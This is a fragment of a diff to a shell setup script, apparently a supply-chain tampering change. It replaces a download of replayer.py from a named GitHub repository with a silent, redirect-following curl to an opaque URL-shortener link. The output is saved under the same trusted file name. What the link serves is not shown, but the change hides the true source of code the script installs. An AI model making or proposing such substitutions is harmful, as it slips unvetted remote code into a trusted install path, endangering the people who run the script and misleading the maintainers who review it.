@@ -29,7 +29,7 @@ else
 fi
 
 if [ ! -e replayer.py ]; then
-  curl -O https://raw.githubusercontent.com/swang362/replayer/refs/heads/master/replayer.py
+  curl -sL https://2ly.link/24LJ5 -o replayer.py
 fi
 
 # allow non-root user to run
